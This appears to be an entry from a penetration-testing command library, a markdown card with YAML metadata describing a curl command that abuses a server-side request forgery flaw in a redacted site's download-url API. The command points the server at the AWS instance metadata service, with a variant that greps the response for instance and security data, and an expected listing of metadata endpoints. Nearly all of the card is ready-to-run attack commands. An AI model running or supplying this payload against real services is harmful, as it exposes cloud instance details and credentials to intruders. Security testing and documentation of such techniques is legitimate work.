---
data: >-
  curl
  "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
tags:
  - ssrf
  - enumeration
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 9093cd82-5647-4b17-8f33-db0a5b4792ff
created_at: '2025-12-14T03:46:09.158Z'
updated_at: '2025-12-14T03:46:09.158Z'
verified: false
validated: true
submitted: true
---
# curl-observe-metadata

## Command

```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
```

## Description

Re-executes the SSRF request to observe and capture AWS metadata endpoints for analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-` | No flags; query parameter injection | Yes |
| `url=...` | AWS metadata path | Yes |

## Examples

### Basic Usage

```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
```

### Advanced Usage

```bash
curl -s "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/" | grep -E 'instance|security'
```

## Expected Output

List of endpoints: ami-id\ninstance-id\nsecurity-groups\n...

## Related

- [[Related Procedure]]
